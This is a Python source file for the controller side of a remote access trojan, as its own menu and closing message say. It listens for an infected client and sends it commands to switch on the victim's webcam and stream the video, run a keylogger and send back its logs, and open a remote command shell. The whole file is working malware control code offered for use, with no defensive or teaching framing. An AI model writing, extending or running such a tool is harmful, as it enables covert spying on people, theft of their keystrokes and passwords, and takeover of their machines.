import socket
import threading
import time
import numpy
import cv2
import struct
import pickle
import os
import platform

# -- GLOBAL VARIABLES -- 
PORT = 8080
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def webCam(conn, command, addr):
    conn.send(command)
    data = b''
    payload_size = struct.calcsize("L") 
    print('\n[+] Webcam is running on client\'s machine\n')
    while True:
        while len(data) < payload_size:
            data += conn.recv(4096)
        
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("L", packed_msg_size)[0]
        
        while len(data) < msg_size:
            data += conn.recv(4096)
        
        frame_data = data[:msg_size]
        data = data[msg_size:]

        frame=pickle.loads(frame_data)
        cv2.imshow(f'Client\'s webcam {addr[0]}:{addr[1]}',frame)
        if cv2.waitKey(5) == 27:
            print('[-] Webcam is terminated')
            time.sleep(1.5)
            break 
    cv2.destroyAllWindows()

def getKeys(conn, command, addr):
    conn.send(command)
    
def transfer(conn,command):
    conn.send(command)
    f = open('key_logs.txt','wb')
    while True:  
        bits = conn.recv(1024*1024)
        if b'DONE' in bits:
            time.sleep(2)
            print('[-] Keylogger terminated completed')
            print('[+] Keylogger file received')
            f.close()
            break
        f.write(bits)
    
def get_shell(conn, command):
   conn.send(command) 
   while True:
        cmd = input("\n[CMD] > ").encode()
        conn.send(cmd)
        
        if b'close' in cmd:
            break

        stdout = conn.recv(1024*1024)
        print(stdout.decode())

def start():
    isLoggerActive = False
    server.listen()
    print("[STARTING] -- Server is starting ... ")
    print(f"[LISTENING] -- Server is listeing on {SERVER}")
    conn, addr = server.accept()
    
    # clears the screen
    if platform.system() in ['Linux', 'Darwin']:
        os.system('clear')
    else:
        os.system("cls")

    while True:
        print(f"[CLIENT CONNECTED] -- {addr[0]} is connected on port {addr[1]}")
        print('''
             ╔╦╦═╗     ╔╗      ╔╗     (`-()_.-=-.
            ╔╝╠╣═╣╔═╦╦╦╣╚╗╔╦╦═╗║╚╗    /00  ,  ,  \      |
            ║╬║╠═║║║║║║║║║║╔╣╬╚╣╔╣  =(o_/=//_(   /====='
            ╚═╩╩═╝╚╩═╩═╩╩╝╚╝╚══╩═╝      ~"` ~"~~` 
            
                        -- COMMANDS --
            open_webcam  -- active client\'s webcam
            logger_start -- start keylogger
            logger_end   -- stop keylogger and recieved keyslog
            get_shell    -- get access to command line 
            terminate    -- terminate trojan 
        ''')
        
        if isLoggerActive:
            print('[+] Keylogger is running on client\'s machine\n')
        
        command = input("[COMMAND] >> ").encode()

        if b'open_webcam' in command:
            webCam(conn, command, addr)
        elif b'logger_start' in command:
            conn.send(command)
            isLoggerActive = True
        elif b'logger_end' in command:
            transfer(conn, command)
            isLoggerActive = False
        elif b'get_shell' in command:
            get_shell(conn, command)
        elif b'terminate' in command:
            conn.send(command)
            break

        if isLoggerActive:
            print('[+] Keylogger is running on client\'s machine')

        # clears the screen
        if platform.system() in ['Linux', 'Darwin']:
            os.system('clear')
        else:
            os.system("cls")
    
    print('[+] Terminating dis nuh rat trojan')
    conn.close()

start()